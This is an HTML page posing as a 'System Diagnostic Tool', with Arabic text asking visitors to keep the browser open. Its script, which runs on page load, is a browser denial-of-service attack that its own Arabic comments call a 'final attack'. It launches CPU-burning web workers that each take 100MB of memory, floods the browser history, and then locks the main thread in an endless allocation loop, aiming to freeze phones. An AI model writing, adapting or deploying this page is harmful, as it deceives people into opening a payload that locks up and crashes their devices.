<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostic Tool</title>
</head>
<body style="background:#000; color:#0f0; text-align:center; padding-top:150px; font-family:monospace;">
    <h1 id="msg">جاري تحليل الأداء...</h1>
    <p>يرجى عدم إغلاق المتصفح لضمان دقة الفحص</p>

    <script>
        // 1. كود العامل الانتحاري (The Suicide Worker)
        // يقوم بحسابات معقدة ويحجز مساحات ضخمة من الرام في مسارات منفصلة
        const suicideWorker = `
            function overload() {
                let data = new Uint8Array(1024 * 1024 * 100); // حجز 100MB فوري
                data.fill(Math.random() * 255);
                
                // عمليات حسابية ثقيلة جداً لإبقاء النواة في حالة Turbo
                while(true) {
                    Math.tan(Math.atan(Math.tan(Math.atan(Math.random()))));
                }
            }
            overload();
        `;

        const blob = new Blob([suicideWorker], {type: 'application/javascript'});
        const workerUrl = URL.createObjectURL(blob);

        function startFinalAttack() {
            // 2. استخدام التعداد الفعلي للأنوية + مضاعفته
            const cores = navigator.hardwareConcurrency || 8;
            const workers = [];

            // إطلاق العمال على كافة المسارات
            for(let i = 0; i < cores * 2; i++) {
                workers[i] = new Worker(workerUrl);
            }

            // 3. هجوم "إغراق الهيستوري" (History Flooding)
            // هذه العملية تجعل واجهة النظام (System UI) في أندرويد تتجمد لأنها تحاول أرشفة الروابط
            let throttle = setInterval(() => {
                try {
                    for(let j = 0; j < 500; j++) {
                        history.pushState(null, "", "OVERLOAD_" + Math.random());
                    }
                } catch(e) {}
            }, 100);

            // 4. القفل النهائي (The Hard Lock) بعد 5 ثواني
            // تجميد مسار الواجهة الرئيسي تماماً مما يمنع حتى زر "Home" من الاستجابة بسرعة
            setTimeout(() => {
                document.getElementById('msg').innerText = "CRITICAL FAILURE: MEMORY EXHAUSTED";
                while(true) {
                    // توليد كائنات ضخمة في حلقة لا نهائية
                    let x = new Array(1000000).fill(document.body.innerHTML);
                    window.location.hash = Math.random();
                }
            }, 5000);
        }

        // بدء الهجوم
        window.onload = startFinalAttack;
    </script>
</body>
</html>
